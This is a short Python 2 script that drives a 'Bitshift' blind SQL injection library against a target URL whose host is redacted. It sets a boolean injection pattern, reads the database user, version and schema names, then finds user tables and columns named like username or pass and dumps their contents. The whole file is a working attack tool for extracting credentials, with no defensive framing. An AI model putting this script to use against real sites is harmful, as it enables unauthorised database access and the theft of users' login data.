#!/usr/bin/python

import Bitshift

bitshift=Bitshift.Bitshift()

bitshift.url="http://XXXXXXXXXXXXXXXXXXX/index.php?id=4&uid="
bitshift.encodemode="urllib_quote"
bitshift.length=6
bitshift.debuglevel=0
bitshift.condition_target="content"
bitshift.reg_condition='true response regex'

bitshift.pattern="1 AND 1=( __BITSHIFT( __QUERY__ )__ ) "

print "User : "+bitshift.get_current_user()
print "Version : "+bitshift.get_version()
print "Current DB : "+bitshift.get_current_db()

bases = bitshift.get_databases(exclude_bases=['information_schema', 'mysql'])

print "Bases : "+str(bases)

for base in bases:
	user_tables = bitshift.get_tables_names_like(base,"user")
	 
	print "User_tables : "+str(user_tables)
	 
	for user_table in user_tables:
		username_columns = bitshift.get_column_name_like(schema=base,table=user_table,like="username")
		pass_columns = bitshift.get_column_name_like(schema=base,table=user_table,like="pass")

		username_pass_columns = list (set(username_columns + pass_columns ))
		
		print "Username_Pass columns : "+str(username_pass_columns)
		
		print user_table+" Data : "+str( bitshift.get_entries(table=user_table,schema=base,columns=username_pass_columns))

# You can also:
		
# bitshift.get_tables_names(database)

# bitshift.get_columns_names(schema=databases,table=table)

# More coming soon...


